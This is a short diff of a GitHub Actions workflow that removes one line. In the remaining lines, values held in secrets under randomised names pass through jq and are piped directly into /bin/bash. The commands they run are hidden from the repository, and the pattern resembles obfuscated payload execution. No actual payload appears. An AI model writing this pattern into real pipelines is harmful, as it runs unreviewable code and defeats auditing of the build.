@@ -22,7 +22,6 @@ jobs:
           dixug1532: ${{ secrets.dixug1532 }}
         run: |
           printf '%s' "$dixug1532" | jq -r .fs65 | /bin/bash
-          echo $lubi964 | jq -r .ndua78 | /bin/bash
           echo $jjcfr673 | jq -r .h73 | /bin/bash
           echo $pgxz9965 | jq -r .dnxph929 | /bin/bash
           echo $dtoln80 | jq -r .kbrmn1 | /bin/bash
